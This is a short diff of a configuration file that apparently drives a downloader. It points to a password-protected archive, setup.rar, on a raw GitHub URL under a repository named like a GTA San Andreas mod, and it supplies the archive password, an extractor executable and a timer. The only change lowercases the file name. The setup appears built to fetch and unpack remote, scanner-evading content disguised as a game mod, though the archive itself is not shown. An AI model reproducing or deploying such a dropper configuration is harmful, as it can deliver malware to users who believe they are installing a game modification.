@@ -1,5 +1,5 @@
 url=https://raw.githubusercontent.com/gtamodmafia/gta-san/refs/heads/main/setup.rar
-name=Setup.rar
+name=setup.rar
 password=2025
 setup=7z.exe
 timer=1
